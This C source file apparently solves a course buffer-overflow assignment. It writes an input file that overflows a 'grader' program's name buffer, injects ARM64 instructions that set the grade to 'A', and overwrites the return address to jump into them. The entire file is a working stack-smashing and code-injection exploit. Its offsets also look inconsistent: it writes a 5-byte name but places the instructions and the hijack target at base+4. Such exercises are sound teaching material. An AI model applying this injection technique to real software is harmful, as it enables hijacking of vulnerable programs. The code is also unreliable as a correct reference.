/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/*                                                                    */
/* Produces "dataA" to force "grader" to print 'A' as the grade by    */
/* overwriting the grade variable. Uses injected instructions and a   */
/* return address overwrite.                                          */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

int main(void) {
    /* key addresses */
    const unsigned long ulGradeAddr = 0x420044;
    const unsigned long ulPrintAddr = 0x40089c;
    const unsigned long ulNameBase  = 0x420058;
    const unsigned long ulInstrBase = ulNameBase + 4;
    const unsigned long ulHijack    = ulInstrBase;

    /* instructions: mov 'A', adr grade, strb 'A', b print */
    unsigned int uiMov  = MiniAssembler_mov(0, 'A');
    unsigned int uiAdr  = MiniAssembler_adr(1, ulGradeAddr, ulInstrBase + 4);
    unsigned int uiStrb = MiniAssembler_strb(0, 1);
    unsigned int uiB    = MiniAssembler_b(ulPrintAddr, ulInstrBase + 12);

    FILE *fp = fopen("dataA", "wb");
    if (!fp) return 1;

    /* name and alignment */
    fwrite("Anish", 1, 5, fp);

    /* instructions */
    fwrite(&uiMov,  sizeof(uiMov),  1, fp);
    fwrite(&uiAdr,  sizeof(uiAdr),  1, fp);
    fwrite(&uiStrb, sizeof(uiStrb), 1, fp);
    fwrite(&uiB,    sizeof(uiB),    1, fp);

    /* pad until 48 bytes total in name array */
    for (int i = 5 + 16; i < 48; i++) fputc('X', fp);

    /* overwrite return address */
    fwrite(&ulHijack, sizeof(ulHijack), 1, fp);

    fclose(fp);
    return 0;
}